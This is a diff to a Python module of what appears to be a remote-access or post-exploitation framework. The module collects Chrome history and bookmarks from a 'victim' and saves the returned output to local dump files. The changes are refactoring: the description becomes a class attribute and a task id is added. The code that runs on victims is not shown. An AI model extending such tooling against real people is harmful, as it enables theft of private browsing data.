@@ -9,7 +9,8 @@ from module import Module
 
 
 class Browser_History(Module):
-
+	description = 'This module retrieves the browser history and bookmarks from chrome browser of the victim.'
+	
 	@classmethod
 	def module_options(cls):
 		h = {
@@ -18,13 +19,11 @@ class Browser_History(Module):
 		return h
 
 	def __init__(self,name,utility,language,options):
-
-		description = 'This module retrieves the browser history and bookmarks from chrome browser of the victim.'
 		## We are loading the script in the script variable here
-		super(Browser_History, self).__init__(name,description,utility,language,getattr(self,f"script_{language}")(options))    
+		super(Browser_History, self).__init__(name,self.description,utility,language,getattr(self,f"script_{language}")(options))    
 
 	## This class is called when victim returns the output for the task of this module. What is to be done with the output is defined here
-	def handle_task_output(self,data,options,victim_id):
+	def handle_task_output(self,data,options,victim_id,task_id):
 		## Comes as a bytes object, so changing to string
 		output = data.decode('utf-8')
 
@@ -35,7 +34,7 @@ class Browser_History(Module):
 		if not os.path.exists(dump_path):
 			os.makedirs(dump_path)
 
-		filename = "browserhistory_"+time.strftime("%Y%m%d-%H%M%S")+".txt"
+		filename = f"browserhistory_{time.strftime("%Y%m%d-%H%M%S")}_{task_id}.txt"
 		file_path = os.path.join(dump_path,filename)
 
 		if 'path' in  options:
